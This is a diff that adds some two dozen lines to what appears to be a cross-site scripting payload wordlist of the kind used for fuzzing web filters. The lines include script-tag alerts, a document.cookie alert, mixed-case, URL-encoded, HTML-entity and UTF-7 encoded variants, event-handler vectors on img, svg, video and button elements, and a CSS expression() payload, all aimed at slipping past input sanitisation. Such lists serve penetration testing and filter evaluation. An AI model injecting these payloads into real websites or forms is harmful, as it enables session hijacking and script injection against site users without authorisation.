@@ -1,1 +1,25 @@
 <script>alert(1234)</script>
+<scRiPt>alert(1);</scrIPt>
+'><script>alert(document.cookie)</script>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<img src="javascript:alert('XSS')">
+%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
+%22%3cscript%3ealert(%22xss%22)%3c/script%3e
+<IMG src="javascript:alert('XSS');">
+<IMG src=javascript:alert('XSS')>
+<IMG src=JaVaScRiPt:alert('XSS')>
+<IMG src=JaVaScRiPt:alert("XSS")>
+<IMG src=javascript:alert('XSS')>
+<IMG src=javascript:alert('XSS')>
+&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29
++/v8 +ADw-script+AD4-alert('90sec')+ADw-/script+AD4-
+%2B%2F%76%38%20%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%27%39%30%73%65%63%27%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D
+<img src=`<body/onload=alert(1) />
+<svg/onload=domain=http://fiddle.jshell.net./KG7fR/5/show>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<video onerror="alert(1)"><source></source></video>
+<form><button formaction="javascript:alert(1)">X</button>
+<img srcset=",,,,,x" onerror="alert(1)">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<style>#test{x:expression(alert(/XSS/))}</style>
